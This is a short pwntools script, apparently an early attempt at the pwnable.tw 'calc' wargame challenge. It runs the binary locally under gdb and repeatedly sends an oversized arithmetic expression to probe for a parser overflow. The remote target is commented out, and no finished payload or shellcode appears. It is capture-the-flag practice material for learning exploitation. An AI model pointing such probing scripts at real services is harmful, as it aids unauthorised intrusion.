#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#p = remote("chall.pwnable.tw", 10100)
p = process("./calc")
gdb.attach(p, 'b main')
p.recv()
payload = b"20000+"*0x1ff
payload += b"2"
for i in range(100):
    p.sendline(payload)
    print(p.recv())
p.interactive()
